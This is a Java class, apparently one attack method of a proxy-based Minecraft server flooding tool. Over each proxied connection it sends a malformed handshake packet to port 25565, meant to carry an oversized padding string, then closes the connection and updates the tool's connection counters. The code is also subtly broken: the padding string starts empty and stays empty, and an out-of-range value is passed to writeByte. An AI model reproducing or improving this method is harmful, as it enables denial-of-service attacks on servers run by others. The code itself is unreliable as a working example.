package dev.xdmeow.core.methods.impl;

import java.io.IOException;

import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.proxy.Proxy;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class BigHandshake implements IMethod{
    private String xd = "";
    private int size = 1024;

    public BigHandshake() {
        for (int i = 1; i < this.size; i++) {
            this.xd += String.valueOf(this.xd);
        }
      }

      public void accept(Channel channel, Proxy proxy) {
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream out = new ByteBufOutputStream(b);
        try {
          out.writeByte(1037);
          out.writeByte(0);
          out.writeBytes(this.xd);
          out.writeByte(9);
          out.writeBytes("localhost");
          out.writeShort(25565);
          out.writeByte(1);
          out.close();
        } catch (IOException e) {
          e.printStackTrace();
        } 
        channel.writeAndFlush(b);
        ++NettyBootstrap.currentConnections;
        ++NettyBootstrap.totalConnections;
        channel.close();
      }
}
